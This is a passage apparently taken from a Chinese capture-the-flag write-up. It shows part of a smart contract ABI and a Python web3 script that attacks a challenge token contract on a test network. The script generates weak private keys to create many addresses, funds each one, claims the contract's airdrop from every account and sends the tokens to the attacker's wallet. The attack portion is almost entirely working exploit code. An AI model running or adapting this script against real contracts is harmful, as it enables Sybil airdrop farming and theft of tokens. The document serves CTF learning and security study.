                    "type": "uint256"
                }
            ],
            "payable": False,
            "stateMutability": "view",
            "type": "function"
        },
        {
            "constant": True,
            "inputs": [],
            "name": "_airdropAmount",
            "outputs": [
                {
                    "name": "",
                    "type": "uint256"
                }
            ],
            "payable": False,
            "stateMutability": "view",
            "type": "function"
        },
        {
            "constant": True,
            "inputs": [
                {
                    "name": "owner",
                    "type": "address"
                }
            ],
            "name": "balanceOf",
            "outputs": [
                {
                    "name": "",
                    "type": "uint256"
                }
            ],
            "payable": False,
            "stateMutability": "view",
            "type": "function"
        },
        {
            "constant": True,
            "inputs": [],
            "name": "owner",
            "outputs": [
                {
                    "name": "",
                    "type": "address"
                }
            ],
            "payable": False,
            "stateMutability": "view",
            "type": "function"
        },
        {
            "constant": True,
            "inputs": [],
            "name": "symbol",
            "outputs": [
                {
                    "name": "",
                    "type": "string"
                }
            ],
            "payable": False,
            "stateMutability": "view",
            "type": "function"
        },
        {
            "constant": False,
            "inputs": [
                {
                    "name": "_to",
                    "type": "address"
                },
                {
                    "name": "_value",
                    "type": "uint256"
                }
            ],
            "name": "transfer",
            "outputs": [
                {
                    "name": "success",
                    "type": "bool"
                }
            ],
            "payable": False,
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "constant": False,
            "inputs": [
                {
                    "name": "b64email",
                    "type": "string"
                }
            ],
            "name": "PayForFlag",
            "outputs": [
                {
                    "name": "success",
                    "type": "bool"
                }
            ],
            "payable": True,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "constant": False,
            "inputs": [],
            "name": "getAirdrop",
            "outputs": [
                {
                    "name": "success",
                    "type": "bool"
                }
            ],
            "payable": False,
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "constant": False,
            "inputs": [],
            "name": "goodluck",
            "outputs": [
                {
                    "name": "success",
                    "type": "bool"
                }
            ],
            "payable": True,
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "inputs": [],
            "payable": False,
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "anonymous": False,
            "inputs": [
                {
                    "indexed": False,
                    "name": "b64email",
                    "type": "string"
                },
                {
                    "indexed": False,
                    "name": "back",
                    "type": "string"
                }
            ],
            "name": "GetFlag",
            "type": "event"
        }
    ]
    mytarget = "0xACB7a6Dc0215cFE38e7e22e3F06121D2a1C42f6C"
    mytarget_private_key = 这是私钥
    transaction_dict = {'chainId': 3,
                        'from':Web3.toChecksumAddress(mytarget),
                        'to':'', # empty address for deploying a new contract
                        'gasPrice':10000000000, 
                        'gas':200000,
                        'nonce': None,
                        'value':10000000000000000,
                        'data':""}
    ggbank_ins = w3.eth.contract(abi=ggbank)
    ggbank_ins = ggbank_ins(address=Web3.toChecksumAddress(target))
    nonce = 0
    def transfer(address, private_key):
        print(address)
        global nonce
        # 发钱
        if not nonce:
            nonce = w3.eth.getTransactionCount(Web3.toChecksumAddress(mytarget))
        transaction_dict['nonce'] = nonce
        transaction_dict['to'] = Web3.toChecksumAddress(address)
        signed = w3.eth.account.signTransaction(transaction_dict, mytarget_private_key)
        result = w3.eth.sendRawTransaction(signed.rawTransaction)
        nonce +=1
        while 1:
            if w3.eth.getBalance(Web3.toChecksumAddress(address)) >0:
                break
            time.sleep(1)
        # 空投
        nonce2 = w3.eth.getTransactionCount(Web3.toChecksumAddress(address))
        transaction2 = ggbank_ins.functions.getAirdrop().buildTransaction({'chainId': 3, 'gas': 200000, 'nonce': nonce2, 'gasPrice': w3.toWei('1', 'gwei')})
        print(transaction2)
        signed2 = w3.eth.account.signTransaction(transaction2, private_key)
        result2 = w3.eth.sendRawTransaction(signed2.rawTransaction)
        # 转账
        nonce2+=1
        transaction3 = ggbank_ins.functions.transfer(mytarget, int(1000)).buildTransaction({'chainId': 3, 'gas': 200000, 'nonce': nonce2, 'gasPrice': w3.toWei('1', 'gwei')})
        print(transaction3)
        signed3 = w3.eth.account.signTransaction(transaction3, private_key)
        result3 = w3.eth.sendRawTransaction(signed3.rawTransaction)
    if __name__ == '__main__':
        j = 0
        for i in range(1000000,100000000):
            private_key = "%064d" % i
            # address = create_address(private_key)
            # print(address)
            # if "7d7ec" in address:
            #     print(address)
            address = "0x" + encode_hex(privtoaddr(private_key))
            if "7d7ec" in address:
                private_key = unhexlify(private_key)
                print(j)
                try:
                    transfer(address, private_key)
                except:
                    traceback.print_exc()
                    print("error:"+str(j))
                j+=1
最终效果显著
![
](https://images.seebug.org/content/images/2018/11/64a3a2f8-f7fe-403a-8eb8-c338a1582ce1.png-w331s)
* * *